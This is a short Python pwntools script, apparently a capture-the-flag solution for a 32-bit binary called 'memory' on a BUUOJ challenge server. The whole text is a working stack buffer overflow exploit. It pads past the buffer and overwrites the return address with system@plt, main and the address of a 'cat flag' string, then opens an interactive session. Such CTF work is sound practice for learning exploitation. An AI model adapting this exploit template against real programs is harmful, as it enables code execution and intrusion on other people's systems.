from pwn import *
context.log_level = 'debug'
io = process('./memory')
# io = remote('node4.buuoj.cn',27412)
elf = ELF('./memory')

cat_flag = 0x80487E0
system_plt = elf.plt['system']
main_addr = 0x08048677

payload = b'a'*(0x13 + 4) + p32(system_plt) + p32(main_addr) + p32(cat_flag)
io.sendline(payload)
io.interactive()